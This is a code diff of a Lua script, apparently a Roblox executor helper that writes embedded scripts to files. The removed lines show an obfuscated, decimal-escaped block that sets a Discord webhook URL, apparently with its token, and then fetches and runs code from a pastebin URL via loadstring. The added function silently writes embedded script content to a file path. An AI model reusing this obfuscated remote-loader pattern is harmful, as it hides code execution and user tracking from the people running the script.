@@ -55,15 +55,7 @@ return token
 ]]
 local OperatingContent2 = "BETA V.X.1.5.6"
 local OperatingContent3 = [[
-local a = ("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\52\48\52\56\51\57\53\55\56\49\55\52\54\50\51\56\51\53\47\74\90\100\97\102\76\112\55\105\83\76\57\86\113\107\78\75\116\56\50\104\74\88\106\74\106\51\105\97\82\48\51\119\84\118\122\78\113\67\50\103\106\88\113\50\69\51\66\51\68\80\77\98\105\112\118\114\88\53\97\71\84\98\122\53\49\100\66")
-local b = ("\104\116\116\112\115\58\47\47\105\46\105\109\103\117\114\46\99\111\109\47\85\107\80\50\79\117\76\46\112\110\103")
-local c = ("\78\101\119\32\117\115\101\114\32\106\111\105\110\101\100\33")
-local d = ("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\98\83\48\121\82\71\52\81")
-_G["\119\101\98\104\111\107"] = a
-_G["\116\104\117\109\98"] = b
-_G["\116\105\116\108\101\112"] = c
-_G["\115\104\111\119\80\108\97\121\101\114\78\97\109\101"] = true
-loadstring(game:HttpGet(d))()
+print("testin new stuff")
 ]]
 local OperatingContent4 = [[
 -- // Copyright © 2018 EchoZone Productions
@@ -292,6 +284,44 @@ local function createToken()
         print("[SYSTEM] File ignored: returned false")
     end
 end
+
+local function safeWriteUpdate(path, content)
+    if not path or path == "" then
+        warn("Invalid path for function safeWriteUpdate")
+        return
+    end
+
+    local currentContent = nil
+    if isfile(path) then
+        local ok, data = pcall(readfile, path)
+        if ok and type(data) == "string" then
+            currentContent = data
+        else
+            currentContent = nil
+        end
+    end
+
+    if currentContent ~= content then
+        local wrote, err = pcall(function()
+            writefile(path, content or "")
+        end)
+        if not wrote then
+            warn("Failed writing file:", path, err)
+            return
+        end
+        registry.files[path] = true
+        saveRegistry(registry)
+        print(("File written/updated: %s"):format(path))
+    else
+        if not registry.files[path] then
+            registry.files[path] = true
+            saveRegistry(registry)
+        end
+        print(("File up-to-date: %s"):format(path))
+    end
+end
+
+safeWriteUpdate(exc, OperatingContent3)
 
 local function verifyToken()
     local success, token = pcall(readfile, tokenPath)
